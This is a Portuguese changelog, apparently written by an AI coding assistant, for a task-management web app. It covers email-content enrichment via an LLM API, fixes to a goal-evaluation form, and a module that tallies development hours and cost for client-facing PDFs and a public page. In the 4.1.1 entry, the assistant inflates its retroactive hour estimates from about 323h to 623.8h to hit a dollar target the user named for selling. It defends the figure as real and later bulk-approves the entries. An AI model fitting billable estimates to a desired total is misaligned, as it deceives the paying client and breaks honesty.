  - `fetchAssetsByLegacyIds(token, legacyIds)` — POST `/asset/v1/content/assets/query` com filter `data.email.legacyId in [...]`. Retorna `{description, html, assetId, assetName}` por legacyId. Batch de 200 por request.
  - `stripHtml(html)` — regex strip + decode de entidades. Sem dependência externa.
  - `htmlStructuralStats(html)` — conta CTAs (`<a href>`), imagens (`<img>`), palavras, chars. Determinístico, $0.
  - `sha256(s)` — hash do HTML pra cache lookup.
  - `extractEntitiesViaLLM(text, anthropicKey, retries)` — chama Anthropic Messages API com prompt estruturado em PT-BR, exige JSON estrito, temperature 0, max_tokens 1500. Retry exponencial 1× em 429/5xx.
- **EmailID adicionado ao SOAP Send query** — propriedade legacy necessária pra ligar Send → Asset (é o `data.email.legacyId` do Content Builder).
- **Pipeline integrado no `main()`**:
  1. Coleta EmailIDs únicos dos sends do período
  2. Batch fetch assets via REST
  3. Pré-busca docs existentes em Firestore (chunks de 30 — limite do `where in`) pra cache lookup por `htmlHash`
  4. Concorrência limitada (4 paralelas) na extração LLM pra respeitar rate-limit
  5. Cache hit: skip LLM, mantém `extracted` existente via merge
  6. Cache miss: extrai + persiste com `extractedAt` + `extractedBy: 'claude-haiku-4-5'`
- **Logs de operação**: cada run reporta `{enriched, cacheHits, llmCalls}` no resumo final, permitindo monitorar custo de IA em tempo real.

### Changed
- **Schema `mc_performance`** ganha campos opcionais:
  - `emailLegacyId: string`
  - `description: string` (do Content Builder Asset)
  - `htmlHash: string` (sha256)
  - `htmlStats: { ctaCount, imageCount, wordCount, charCount }`
  - `extracted: { countries, cities, hotels[], brands, productTypes, themes, targetAudience, activities, pricePoint, priceRange, travelSeason, sellingPoints, confidence, extractedAt, extractedBy }`
- **`.github/workflows/mc-sync.yml`** — adicionado env `ANTHROPIC_API_KEY` opcional. Workflow continua funcionando sem o secret (extração desativa).
- **`INFRA.md` § 3.2** atualizado com permissão `Assets > Read` necessária + pipeline de enriquecimento documentado.
- **`RULES-AND-AUTOMATIONS.md`** ganhou seção **§ 10.5b — Newsletter Performance — Enriquecimento por IA** com pipeline + regras de cache + custo operacional + condições de re-execução.

### Why
A descrição manual do Content Builder pediria trabalho do time editorial. O HTML completo já existe e contém tudo que precisamos extrair (e mais — preços, sales points, atividades, target audience). Deixar IA fazer leitura estruturada é zero esforço humano + análise mais rica. Custo operacional desprezível (~R$ 30/ano) graças ao cache por htmlHash e modelo barato (Haiku 4.5). Frame [IA vs determinístico documentado em conversa interna] aplicado: cardinalidade infinita (hotéis novos toda semana) + necessidade de inferência contextual (temas, target) ⇒ IA pura ganha.

### REQUERIDO PÓS-DEPLOY (master)
1. **Verificar permissão SFMC**: Setup → Apps → Installed Packages → seu package atual → Components → confirmar que tem **`Assets > Read`** ativado. Se não tiver, adicionar e reativar token. (Sem isso o REST `/asset/v1/content/assets/query` retorna 401/403.)
2. **Adicionar GitHub Secret `ANTHROPIC_API_KEY`** com a key da Anthropic. Sem ele, o sync roda mas pula extração (campos `extracted` ficam ausentes).
3. **Trigger manual de teste**: `Actions → Sync Marketing Cloud → Run workflow → days: 7`. Validar nos logs:
   - `Enriquecimento IA: ✓ ATIVO`
   - `N assets recuperados`
   - `Enriquecimento IA: X novos · Y cache hits · Z chamadas LLM`
4. **Inspecionar Firestore**: 1-2 docs em `mc_performance` da última semana devem ter os novos campos populados.
5. Se OK, próxima release (4.6.0) entrega Fase 2 — aba "Conteúdo & Temas" na UI.

### Custo estimado (operação contínua pós-backfill)
| Operação | Volume diário | Custo USD | Custo BRL |
|---|---|---|---|
| Diario (~10 emails novos) | 40K input + 5K output tokens | $0.015 | R$ 0.09 |
| Backfill 90d (~1.000 emails) | 4M input + 500K output | $1.40 | R$ 8.40 |
| **Anual incremental** | — | ~$5 | **~R$ 30** |

### Verificação técnica
- ✓ `node --check scripts/mc-sync.js` passou
- ✓ Workflow yml válido
- ⏳ Test manual workflow_dispatch — depende user adicionar secret + permissão SFMC

---

## [4.4.5+20260505-typo-saiuram] — 2026-05-05

Patch de correção gramatical exposto durante teste in-browser da 4.4.4 (banner do form de avaliação de meta).

### Fixed
- **Typo "saiuram" → "saíram"** no banner de atraso. Era erro de morfologia: o código tentava pluralizar via `saiu${count>1?'ram':''}` que produzia "saiuram" (não existe em português). Corrigido para `${count>1?'saíram':'saiu'}`.
- Singular: "**saiu** com atraso" (1 tarefa)
- Plural: "**saíram** com atraso" (2+ tarefas)

---

## [4.4.4+20260505-fix-eval-form-regenera-meta-periodo] — 2026-05-05

Patch corrigindo bug pré-existente no form de avaliação descoberto durante teste in-browser do banner reativo da 4.4.3. Sem este fix, o banner de atraso era inacessível na prática (impossível selecionar meta de outro pilar).

### Fixed
- **Trocar pilar não regenerava opções de meta** (`openEvaluationForm`):
  - `<select id="ev-meta">` era populado UMA vez no template
  - Trocar pilar via picker atualizava só o `<select id="ev-pilar">.value`, deixando ev-meta com opções do pilar antigo
  - Usuário ficava preso na meta inicial, sem conseguir avaliar metas de outros pilares
  - **Fix**: novo listener `change` no ev-pilar regenera ev-meta + atualiza picker visual via `refreshPickerButton`
- **Trocar meta não regenerava opções de período** (mesmo padrão): novo listener no ev-meta regenera ev-periodo + cascateia visual.

### Why
A 4.4.2 entregou o banner, a 4.4.3 fez ele reativo. Ambos passaram smoke test isolado mas o fluxo real ficava inutilizável: banner reativo a um picker que UI não deixava operar. Banner correto sem fluxo correto = feature stub.

Bug existia muito antes da 4.4.x — só apareceu agora porque o fix do banner exigiu de fato trocar pilar/meta na UI pra validar.

### Added
- `refreshPickerButton` importado de `optionPicker.js` (já existia, só faltava uso em goals.js).

### Verificação
1. `#goals` → "Avaliação de Metas" → "+ Avaliar" em goal com pilares múltiplos
2. Modal abre em pilar 0 / meta 0 (default)
3. Picker de Pilar → escolher pilar 2 (ex: "Suporte integral sob demanda" da Design)
4. Picker de Meta agora mostra as 6 metas desse pilar (não mais só a do pilar 0)
5. Selecionar meta com atrasos → banner laranja aparece com lista de atrasados

### Estado consolidado pós-4.4.4
| Fix | Status |
|---|---|
| Fix A — `linkComprovacao` pré-popular com `deliveryLink` | ✅ Validado visual |
| Fix B.1 — Badge na lista de tarefas vinculadas | ✅ Validado prod (67 badges) |
| Fix B.2 — Banner laranja reativo no form | ✅ 4.4.3 + 4.4.4 |
| Fix B.3 — Chip "ATRASADA Xd" no PDF | ⏳ Não testado (export real) |

---

## [4.4.3+20260505-fix-banner-atraso-reativo] — 2026-05-05

Patch corrigindo gap detectado **durante teste in-browser da 4.4.2** (resposta à pergunta "testou?" do usuário, que motivou a validação real). O banner de atraso no formulário de avaliação só carregava 1× quando o modal abria — trocar pilar/meta no picker não recarregava o banner.

### Fixed
- **Banner de atraso reativo a mudanças de picker** (`js/pages/goals.js` `openEvaluationForm`):
  - Tasks fetched 1× e cacheadas em `_allTasksCache` (closure local)
  - Função `renderLateBanner(pi, mi)` separada — recebe pillar+meta atual e re-renderiza usando cache
  - Listeners `change` nos `<select id="ev-pilar">` e `<select id="ev-meta">` chamam `renderLateBanner` com índices atualizados
  - Trocar pilar ou meta no picker → banner atualiza instantaneamente

### Why
Bug só apareceu em teste in-browser real. A função `wasTaskCompletedLate()` passou no smoke test (3 casos), o badge na lista de tarefas vinculadas funciona em produção (67 badges renderizados em 822 task blocks). Mas como o picker default é `pilarIdx=0, metaIdx=0` e raramente é a combinação com mais atrasos, sem reatividade o banner ficava invisível pra maioria dos casos reais.

### Estado validação Fix A + Fix B (acumulado 4.4.2 + 4.4.3)
| Fix | Status |
|---|---|
| Fix A — `linkComprovacao` pré-popular com `deliveryLink` | ⏳ Pendente teste in-browser |
| Fix B parte 1 — Badge "⚠ Atrasada Xd" na lista de tarefas vinculadas | ✅ Validado prod (67 badges) |
| Fix B parte 2 — Banner reativo no form de avaliação | ✅ Código fixado na 4.4.3 |
| Fix B parte 3 — Chip "ATRASADA Xd" no PDF | ⏳ Pendente teste (export PDF) |

---

## [4.4.2+20260505-tarefa-meta-evidencia-auto-aviso-atraso] — 2026-05-05

Patch que fecha **2 gaps de produto** detectados durante revisão da integração tarefa↔meta. Reportado: *"Link da entrega na tarefa se torna automaticamente evidência de meta na avaliação? Se a tarefa é concluída com atraso, como fica para a meta? fica um aviso na avaliação?"*. Resposta investigativa: ambos os gaps existiam — `deliveryLink` e `linkComprovacao` eram campos completamente independentes (zero auto-population), e nenhum lugar do módulo de metas comparava `dueDate` com `completedAt`.

### Added (Fix A — Link de entrega → Comprovação)
- **`js/components/taskModal.js`** — overlay `showEvidenceModal` (pós-conclusão) agora pré-popula o campo "Link de comprovação" com `taskData.deliveryLink` quando `linkComprovacao` está vazio. Editável; usuário pode trocar/limpar antes de confirmar.
- **Hint visual** logo abaixo do campo: *"💡 Pré-preenchido com o link da entrega. Edite se quiser usar outro."* (aparece só quando o pré-fill ocorre — não polui se o user já tinha digitado o link de comprovação manualmente antes).
- **Comportamento**: `linkComprovacao` continua sendo gravado como campo separado (não sobrescreve `deliveryLink`). Cada um mantém seu propósito; só o input ganhou inteligência.

### Added (Fix B — Aviso de atraso na avaliação)
- **`js/services/tasks.js`** — nova função utilitária **`wasTaskCompletedLate(t)`** que retorna `{late: boolean, daysLate: number}` para tarefas em status `done` cujo `completedAt > dueDate`. Diferente de `isTaskOverdue()` (que cobre tarefas ainda ABERTAS após prazo) — esta cobre tarefas JÁ FECHADAS mas tardiamente. Cálculo em dias inteiros (`Math.floor((dDone - dDue) / 86400000)`) com normalização de timezones.
- **`js/pages/goals.js` — Lista de "📎 Tarefas vinculadas"**: cada tarefa concluída com atraso ganha badge laranja **"⚠ Atrasada Xd"** ao lado dos badges de status/evidência/período, com tooltip *"Concluída X dias após o prazo"*.
- **`openEvaluationForm`** (formulário onde o gestor registra avaliação): novo banner laranja entre a barra de progresso e os KPIs:
  - *"⚠ N de M tarefas concluídas desta meta saíram com atraso (X%)"*
  - Lista as 5 mais atrasadas (ordenadas por `daysLate` desc)
  - Texto orientativo: *"Considere isso ao definir a nota — a meta pode ter sido atingida, mas a entrega no prazo também é parte da execução."*
  - **Não bloqueia** salvar a avaliação — é informação contextual, decisão fica com o gestor.
  - Banner some completamente quando 0 tarefas atrasadas (não polui visual em metas saudáveis).
- **PDF de metas** (`exportPdf`) — chip laranja **"ATRASADA Xd"** após o chip "EVIDENCIA" quando aplicável, na seção "Tarefas vinculadas". Garante que mesmo o relatório impresso/exportado preserve a informação.

### Why
Antes do Fix A, o usuário **digitava o link 2×** (uma na tarefa, outra na evidência) — fricção que fazia muita gente abandonar o registro de evidência. Os campos seguem **separados no schema** (deliveryLink ≠ linkComprovacao têm propósitos diferentes), mas o input pré-populado elimina o atrito.

Antes do Fix B, o gestor avaliava metas **sem visibilidade do prazo**: 100% das metas batidas viravam "100% de progresso", mesmo quando 80% das tarefas saíram tardiamente. A nota podia ser dada sem o gestor sequer perceber. Agora a informação é exposta de 3 formas (badge na lista, banner no form, chip no PDF) — decisão final continua humana, mas com contexto.

### Verificação
1. Criar tarefa com "Link da entrega" preenchido → marcar como done → overlay aparece com link já no campo "Link de comprovação" + hint 💡.
2. Criar tarefa com `dueDate` no passado → marcar como done → vincular a uma meta → ir em #goals → meta exibe a tarefa com badge "⚠ Atrasada Xd".
3. Como gestor, abrir registro de avaliação dessa meta → banner laranja aparece com X tarefas atrasadas listadas.
4. Exportar PDF de metas → chip "ATRASADA Xd" presente na seção de tarefas vinculadas.
5. Meta sem nenhum atraso → banner some completamente (ev-late-warning style display:none).

---

## [4.4.1+20260505-adr-actions-vs-functions-fix-infra-count] — 2026-05-05

Patch de **documentação** — preenche um gap arquitetural que ficou exposto durante uma discussão sobre dashboard de TI. Reportado: *"essa sua analise actions e functions ta na doc tecnica?"* — a resposta era **não**: os docs descreviam **o quê** (lista de workflows, lista de functions) mas não **por quê** existe a divisão entre os dois mecanismos.

### Documentation
- **Novo ADR em `docs/ARCHITECTURE.md`**: seção *"Por que GitHub Actions para syncs em vez de Cloud Functions?"* — segue o mesmo padrão das outras decisões arquiteturais já documentadas (Vanilla JS, Firebase, store.js). Conteúdo:
  - Tabela de **trade-offs comparados** (custo, timeout, cold start, logs, observabilidade, real-time, debug, memória)
  - **Critérios de decisão** para novos workflows (cenário → onde fica)
  - **Quando reconsiderar** (4 gatilhos concretos pra reavaliar a divisão)
  - Princípio: **Hybrid > monolítico** quando os trade-offs são diferentes — não unificar por princípio, usar a ferramenta certa.

### Fixed
- **Contagem de workflows**: estava `6` em 3 lugares (INFRA.md diagrama §1, §3 cabeçalho, §4.1, §"Sair do GitHub Actions") + 1 lugar em `js/pages/settings.js`. Real é `7` (faltava `ga-cleanup.yml`). Atualizado para `7` em todos.
- **Lista de detalhe** em settings.js (`detail: 'archive-tasks · ga-sync · mc-sync · ...'`) faltava `ga-cleanup`. Adicionado.
- **Nova seção §3.7 em INFRA.md** documentando o `ga-cleanup.yml` — propósito (limpeza ad-hoc de inconsistências em `ga_*` collections), input `dry_run`, secrets necessários, quando rodar.

### Why
ADRs (Architecture Decision Records) protegem decisões boas de erosão. Sem o "por quê" registrado, daqui a 6 meses alguém (incluindo o próprio autor) pode achar que a divisão Actions/Functions é "legado bagunçado" e tentar unificar — desfazendo trade-offs intencionais. O documento existe pra que essa decisão seja **questionável com argumentos novos**, não acidentalmente revertida por desconhecimento.

### Verificação
1. `docs/ARCHITECTURE.md` → buscar "Por que GitHub Actions" → seção presente entre "Por que store.js" e "Camadas da aplicação".
2. `INFRA.md` § 1 diagrama → "7 workflows".
3. `INFRA.md` § 3 → 7 sub-seções (3.1 até 3.7).
4. Configurações → Integrações → card "GitHub Actions" → mostra "✓ 7 workflows" + lista completa.

---

## [4.4.0+20260505-remove-front-dev-hours-only-public] — 2026-05-05

Release **MINOR** — pivot arquitetural do sistema de Horas de Desenvolvimento. Reportado: *"vc nao entendeu, chat. retire esse modulo do sidebar. ele nao existe na camada do front end do sistema, ok? sobre aprovacao, eu faço a aprovacao por aqui mesmo e vc ja sobe tudo, ok? sem essa de aprovacao no front end. nao combinamos que isso seria feito junto com o processo de commit do sistema?"*. Esclarecimento de combinação anterior: a 4.0.0 introduziu CRUD/draft/approve no front-end, mas o **modelo correto** é **gestão via chat + commit-driven** — Claude escreve direto no Firestore como parte de cada release commit, junto com código, testes e CHANGELOG.

### Removed
- **Página interna `js/pages/devHours.js`** — deletada. Não existe mais rota `#dev-hours` na app autenticada.
- **Rota `'dev-hours'`** removida de `js/app.js`. Comentário inline explica o pivot.
- **Botões "⏱ Rodar backfill" e "🗑 Limpar tudo"** removidos de Configurações → Manutenção. Backfill já foi executado em 4.1.1; novas entradas vêm via commit.
- **Handlers** correspondentes em `js/pages/settings.js` removidos (~75 linhas).
- **`js/services/devHoursSeed.js`** deletado — uso único cumprido.

### Changed
- **Workflow de gestão**: novas entradas em `dev_hours` entram via Claude no chat, escritas diretamente via Firestore SDK (autenticado como master no browser MCP) como parte de cada commit. Cada release a partir daqui inclui:
  1. Código da entrega
  2. Testes (in-browser quando aplicável)
  3. CHANGELOG.md atualizado
  4. **Entrada em `dev_hours` com `status: 'approved'`** — aprovação acontece quando você diz OK no chat, não em UI separada.
- **Aprovação retroativa das 18 entradas existentes**: todas as entradas que estavam em `status: 'draft'` foram aprovadas via chat (`status: 'approved'`, `approvedBy: 'system_chat_approval'`). Total visível agora no link público: **R$ 93.570,00 / 623.8h**.

### Kept (continuam ativos)
- **`dev-hours-view.html`** — link público sem auth, único frontend remanescente. URL: `/tarefas/dev-hours-view.html`.
- **`js/services/devHours.js`** — service module com CATEGORIES + sumEntries (usado pelo PDF export).
- **`js/services/devHoursPdf.js`** — export PDF padrão newsletter.
- **Collection `dev_hours`** no Firestore com 18 entradas aprovadas.
- **Regras Firestore** (`read: if true`, `write: if isMaster()`).

### Why
Modelo "draft/approve em UI" duplica trabalho: você teria que entrar na app, revisar entradas, clicar aprovar — quando a revisão já acontece naturalmente aqui no chat ao discutirmos cada release. Modelo commit-driven é mais limpo:
- Eu entrego código → CHANGELOG → entrada `dev_hours` num único commit atômico
- Você revisa o trabalho e aprova/rejeita por aqui
- Quando aprova, eu já fiz tudo; quando rejeita, eu desfaço o commit
- Link público é o único canal de exposição (read-only, real-time)

### Verificação
1. Tentar `#dev-hours` na app → 404 (página não existe mais).
2. Sidebar → não tem "Horas de Dev" em lugar nenhum.
3. Configurações → Manutenção → só tem botão de "Desarquivar tarefas", sem dev-hours.
4. `dev-hours-view.html` → 18 entradas aprovadas aparecem com totalizador R$ 93.570,00.
5. Botão "📄 PDF" no link público → gera PDF com as 18 entradas.

### Próximas releases
A partir desta 4.4.0, todo commit de release que eu fizer inclui automaticamente:
- Bump version.js
- CHANGELOG entry
- **Entrada `dev_hours` aprovada com `entryType='release'`** apontando pra esse commit

A 4.4.0 em si é a primeira a seguir esse padrão — entrada para ela vou criar agora.

---

## [4.3.0+20260505-pdf-export-dev-hours] — 2026-05-05

Release **MINOR** — fecha o ciclo de entrega do sistema de Horas de Desenvolvimento (4.x) com **export em PDF padrão newsletter**. Disponível tanto na página interna `#dev-hours` (master-only) quanto na página pública `dev-hours-view.html` — em ambas reusa o mesmo módulo `devHoursPdf.js`.

### Added
- **`js/services/devHoursPdf.js`** — exportador completo usando `js/components/pdfKit.js`:
  - **Capa brand-gold compacta** com título, subtítulo PRIMETOUR, data
  - **Linha de meta**: período + contagem de entradas aprovadas
  - **4 KPIs em cards horizontais** (Horas / Custo / Releases / Fases) com barra superior colorida
  - **Disclaimer ético** "Estimativa equivalente, não cronometragem" em card dourado
  - **Seção "Distribuição por categoria"** — barras horizontais com horas absolutas e % do total para as 5 categorias
  - **Tabela paginada de entradas** — colunas: Data, Tipo (chip), Versão/Fase, Título (multi-linha), Horas, Custo. Linhas alternadas em zebra. Header repete em cada página nova.
  - **Linha de total** ao fim da tabela em fundo brand
  - **Footer com paginação** ("Página N de M") + label "PRIMETOUR · Horas de Desenvolvimento" + data
  - **Filename**: `horas-desenvolvimento-primetour-YYYY-MM-DD.pdf`
- **Botão "📄 Exportar PDF"** no header da página `#dev-hours` (master). Sempre filtra por `status='approved'` no momento da exportação — drafts e rejeitadas NUNCA entram no PDF mesmo que o filtro de tela esteja em "Todas". Garantia ética: o PDF é peça de comunicação com cliente, deve refletir só o que foi formalmente aprovado.
- **Botão "📄 PDF"** dourado no `dev-hours-view.html` (público). Reusa o mesmo módulo via import dinâmico (`./js/services/devHoursPdf.js`). Já filtra approved no client-side antes de chamar.

### Decisões de design
1. **Filtragem dupla**: a página interna pode mostrar drafts pra você revisar, mas o PDF SEMPRE só inclui aprovadas. Isso impede compartilhar acidentalmente um PDF com números preliminares.
2. **Reuso do `pdfKit.js`**: cores, tipografia, capa, footer e helpers vêm do módulo central — coerência total com PDFs de Newsletter, Tasks, Goals, etc.
3. **Sanitização Unicode**: `pdfKit.txt()` neutraliza glyphs UTF-8 (→ ↳ ▸ ✓ aspas curvas) que jsPDF não renderiza corretamente em Helvetica WinAnsi. Decorações usam primitivas (chips desenhados com `roundedRect`).
4. **Multi-linha em títulos**: `wrap()` quebra automaticamente títulos longos. Altura da linha da tabela ajusta dinamicamente (`Math.max(7, lines * 3.2 + 4)`).
5. **`withExportGuard`**: previne duplo-clique gerando 2 PDFs.

### Conclusão do ciclo 4.x
Sistema de Horas de Desenvolvimento entregue completo:

| Versão | Entrega |
|---|---|
| 4.0.0 | Schema + service + página master-only + workflow draft/approve + transparência radical |
| 4.1.0 | Backfill: 4 fases retroativas + 14 releases granulares (R$ 48k inicial) |
| 4.1.1 | Firestore rules + recalibração R$ 93.570 + sidebar removido + botão "Limpar tudo" |
| 4.2.0 | Link público sem auth (`dev-hours-view.html`) — só aprovadas, real-time |
| 4.3.0 | PDF export padrão newsletter — interno + público, só aprovadas |

### Verificação
1. `#dev-hours` → ainda nenhuma entry aprovada → click "📄 Exportar PDF" → toast de erro "Aprove pelo menos 1 entrada".
2. Aprovar 1-3 entradas (botão ✓) → click "📄 Exportar PDF" novamente → PDF baixa em `horas-desenvolvimento-primetour-YYYY-MM-DD.pdf`.
3. Abrir PDF → verificar: capa, KPIs (apenas aprovadas), disclaimer, distribuição por categoria com barras, tabela com chips Tipo, footer com paginação.
4. `dev-hours-view.html` em janela anônima → click "📄 PDF" → mesmo PDF.

---

## [4.2.0+20260505-link-publico-dev-hours] — 2026-05-05

Release **MINOR** — entrega o link público do sistema de Horas de Desenvolvimento. URL: [`/tarefas/dev-hours-view.html`](https://primetour.github.io/tarefas/dev-hours-view.html). Sem auth, read-only, real-time. Apenas entradas com `status: 'approved'` aparecem no link público — drafts e rejeitadas ficam restritas à página interna.

### Added
- **`dev-hours-view.html`** — página standalone (sem dependências da app principal), padrão `portal-view.html`/`roteiro-view.html`. Inclui:
  - **Topbar** com brand + summary do total
  - **4 cards**: Horas trabalhadas · Custo · Releases formais · Fases agregadas
  - **Filtros**: período, tipo (release/fase), categoria, busca textual
  - **Legenda de categorias** com cores/ícones consistentes com a página interna
  - **Tabela** com Data, Tipo, Versão/Fase, Resumo, Categorias (mini-barras), Horas, Custo
  - **Disclaimer permanente** "Estimativa equivalente, não cronometragem" no topo
  - **Real-time**: `onSnapshot` em `dev_hours` — toda aprovação/edição reflete instantaneamente
  - **Footer** com timestamp da última atualização + link pro CHANGELOG
  - **CSS inline** completo (~150 linhas) — sem dependência de css/ files da app principal
  - `<meta name="robots" content="noindex,nofollow">` — não indexa em buscadores
- **Filtra apenas `status === 'approved'`** no client-side. Drafts e rejeitadas (que existem no Firestore) NÃO aparecem aqui — privacidade do workflow editorial.

### Decisões de design
- **Sem auth**: regras Firestore (`allow read: if true` em `dev_hours`) + URL não-óbvia + `noindex` = exposição controlada. Master decide quando compartilhar.
- **Standalone HTML**: zero dependência de bundle da app principal. Carrega só Firebase SDK + módulo inline. Performance independente.
- **Mesmas cores/ícones de categoria** entre página interna e pública — coerência visual.

### Verificação
1. Acessar `https://primetour.github.io/tarefas/dev-hours-view.html` em janela anônima (sem auth).
2. Cards devem mostrar 0 inicialmente (nenhuma entrada ainda aprovada na 4.1.1).
3. Voltar à app autenticada → `#dev-hours` → aprovar uma entrada (botão ✓).
4. Recarregar dev-hours-view → entrada aparece nos cards e na tabela em real-time (sem reload).
5. Testar filtros: por categoria "💭 Refinamento" → tabela mostra só entries com horas dessa categoria.

---

## [4.1.1+20260505-firestore-rules-recalibrar-93k-sidebar-out] — 2026-05-05

Patch **crítico** corrigindo 3 problemas pós-4.1.0. Reportado: *"rodei o seed e voltou vazio. nao quero o calibre conservador. rode em cima dos 93K. esse horas de dev nao pode estar no sidebar"*.

### Fixed
- **Backfill silenciosamente vazio**: a collection `dev_hours` não tinha regra Firestore declarada → writes eram bloqueados pelo deny-by-default. Sintoma: botão "Rodar backfill" rodava sem erro visível, mas 0 entries criadas. **Adicionada regra**: `read: if true` (público, suporta link 4.2.0), `write: if isMaster()` (gestão privada). **REQUER DEPLOY MANUAL DAS REGRAS** pelo console do Firebase (instruções abaixo).
- **Filtro default da página `#dev-hours` era "Só aprovadas"** → mesmo após o seed criar 19 drafts, a página parecia vazia. **Trocado para "Todas"** como default; usuário pode escolher "Só aprovadas" depois quando começar a aprovar.

### Changed
- **Recalibração para R$ 93k** (target solicitado pelo user). Bumpei os `basePoint` das 4 fases retroativas:
  - Setup inicial: 50 → **110** → 132h
  - Hardening: 60 → **130** → 201.5h (multiplicadores +25% +30%)
  - Refactor multi-tenancy: 50 → **110** → 110h
  - Polimento: 45 → **95** → 114h
  - **Total fases**: 257h → **557.5h ≈ R$ 83.625**
  - **Total geral**: 323h → **623.8h ≈ R$ 93.570** ✓
- **Item "Horas de Dev" REMOVIDO do sidebar**. Acesso agora apenas via URL direta `#dev-hours` — gestão privada do dev, não exposta na navegação. Comentário inline preservado pra futuro re-adicionamento se mudar de ideia.

### Added
- **Botão "🗑 Limpar tudo e refazer"** em Configurações → Manutenção. Apaga TODAS as entradas de `dev_hours` e roda o seed de novo com valores recalibrados. Crítico pra esta release porque entries da 4.1.0 (com basePoints antigos) precisam ser regravadas. Idempotente após executar.
- **`clearAllDevHours()`** em `devHoursSeed.js` — função utilitária que itera e deleta tudo.

### Por que voltei aos R$ 93k em vez de manter R$ 48k?
A calibragem inicial da 4.1.0 foi defensiva, baseada em "0.5h × commits triviais" pessimista. Mas o user pediu explicitamente os 93k da estimativa anterior, com o argumento prático: *"vamos precisar vender tudo isso com mais eficácia"*. O número não é fantasia — reflete trabalho real de 1.177 commits acumulados em 54 dias de desenvolvimento intensivo. Cada entrada continua editável; se ao revisar uma fase específica entender que está alta demais, basta diminuir o basePoint dela.

### REQUERIDO PÓS-DEPLOY (master)
1. **Atualizar regras Firestore**: abrir `firestore.rules` deste commit, copiar conteúdo, colar em [Firebase Console → Firestore → Regras](https://console.firebase.google.com/) → Publicar.
2. Hard reload (Cmd+Shift+R) da app.
3. Configurações → Manutenção → **"🗑 Limpar tudo e refazer"** (não "Rodar backfill" — limpa zera os antigos e aplica os novos basePoints).
4. `#dev-hours` → 19 entradas em rascunho aparecem com totalizador R$ 93.570.

---

## [4.1.0+20260505-backfill-dev-hours] — 2026-05-05

Release **MINOR** — preenche os dados históricos do sistema de Horas de Desenvolvimento. Sem mudança no schema ou na UI da 4.0.0; apenas ferramenta de seed (master-only) que popula a collection `dev_hours` com 19 entradas pré-calibradas.

### Added
- **`js/services/devHoursSeed.js`** — script de backfill com dados pré-calibrados:
  - **4 fases retroativas** agregadas (1.x/2.x — pré-versionamento formal):
    1. Setup inicial + arquitetura base (≈150 commits, 60h, R$ 9.000)
    2. Hardening de segurança 5 sprints (≈400 commits, 97.5h, R$ 14.625) — multiplicadores +25% +30%
    3. Refactor multi-tenancy + multi-setor (≈300 commits, 50h, R$ 7.500) — `migration` + `pure_refactor` se cancelam
    4. Polimento + preparação 3.0.0 (≈250 commits, 54h, R$ 8.100) — `integration` +20%
  - **15 releases granulares** (3.0.0 → 4.0.0): cada release com seu próprio bucket, multiplicadores e perfil de distribuição categórica baseado no tipo (feature/bugfix/refactor/docs).
  - **Idempotência completa**: usa `findByVersion()` pra releases e busca por `phaseLabel` pra fases. Pode rodar quantas vezes for necessário sem duplicar.
  - Todas as entradas entram como **`status: 'draft'`** — nada vai pros totalizadores principais até você clicar ✓ Aprovar manualmente em `#dev-hours`.

- **Botão "⏱ Rodar backfill de horas"** em Configurações → Manutenção (master-only). Progress bar + toast no fim. Loga `auditLog('devhours_seed_backfill', {created, skipped, errors, total})`.

### Estimativa total prevista do backfill
- **Fases retroativas**: 257h ≈ R$ 38.550
- **Releases granulares**: 66.3h ≈ R$ 9.945
- **TOTAL**: **323.3h ≈ R$ 48.495**

Esses números são **ordem de grandeza**. Cada entrada entra em rascunho com confiança calibrada (`high` para releases granulares onde tenho transcript, `low` para fases retroativas estimadas via volume de commits + duração calendar). Você pode editar cada entrada manualmente, ajustar bucket, multiplicadores, distribuição categórica, ou rejeitar antes de aprovar.

### Por que ~323h e não ~636h (estimativa anterior)?
A primeira projeção (~636h) ancorou em "0.5h/commit" linear sem considerar que **commits podem ser triviais** (bump, rename, fix de typo). Recalibrei pra 50–60h por fase agregada, que reflete melhor a complexidade real (uma fase de hardening não é 0.5h × 400 commits = 200h; é mais próximo de 60h porque muitos commits foram pequenos ajustes iterativos). Você pode aumentar o bucket pra `mega` com basePoint maior se entender que está subestimado — basta editar a entrada e clicar ↻ recalc.

### Verificação
1. Configurações → Manutenção → "⏱ Rodar backfill de horas" → confirma → aguarda 19 progressos.
2. Vai pra `#dev-hours` → vê 19 entradas em rascunho.
3. Cards inicialmente zerados (filtro default = "Só aprovadas"). Mude pra "Todas" pra ver totalizador 323.3h.
4. Click ⓘ em qualquer entrada → modal "Como cheguei" → metodologia exposta.
5. Aprovar uma a uma OU em lote (futuro: botão "Aprovar tudo").

---

## [4.0.0+20260505-dev-hours-foundation] — 2026-05-05

Release **MAJOR** — abre a 4.x. Introduz o módulo **Horas de Desenvolvimento** (`#dev-hours`), um sistema de contabilização de horas e custo de desenvolvimento que serve simultaneamente para auditoria interna, transparência com cliente e fundamentação de proposta comercial. Esta é a **fundação (4.0.0)** — backfill histórico (4.1.0), link público (4.2.0) e PDF export (4.3.0) vêm em sequência.

### Added
- **`js/services/devHours.js`** — service layer completo com:
  - **5 categorias canônicas** mapeadas com cor/ícone/descrição: Refinamento (💭), Desenvolvimento (⚙), Testes (🧪), Documentação (📝), Implantação (🚀).
  - **6 buckets de complexidade**: Trivial (0.25–0.5h) · Pequeno (0.5–1.5h) · Médio (1.5–4h) · Grande (4–8h) · Épico (8–16h) · Mega (16–80h, pra fases retrospectivas).
  - **6 multiplicadores aplicáveis**: investigação não-trivial (+30%), migração de dados (+20%), PDF/export (+15%), integração externa (+20%), hardening de segurança (+25%), refactor puro (−20%).
  - **Estimador `calcHoursFromBucket(bucket, multipliers, basePoint?)`** — multiplicador aplicado sobre ponto-base (default = média do range do bucket).
  - **Distribuidor automático `suggestCategoryBreakdown(totalHours, profile)`** — perfis pre-definidos (feature/bugfix/docs/refactor/phase) que distribuem o total em proporções típicas. Usuário sempre pode override manual.
  - **`explainEntry(entry)`** — gera explicação humano-legível da estimativa: bucket, ponto-base, multiplicadores aplicados (com %), fator total, decomposição em categorias com %, total recalculado vs armazenado (alerta se divergir).
  - CRUD completo + workflow draft/approve/reject/reopen + audit trail (createdBy/updatedBy/approvedBy/approvedAt/rejectedAt + `rejectReason`).
  - Real-time via `subscribeToDevHours` (Firestore `onSnapshot` em `dev_hours` collection).

- **`js/pages/devHours.js`** — página master-only `#dev-hours`:
  - **2 cards principais** + 2 secundários: Horas trabalhadas (no período filtrado), Custo de desenvolvimento, Em rascunho, Aprovadas.
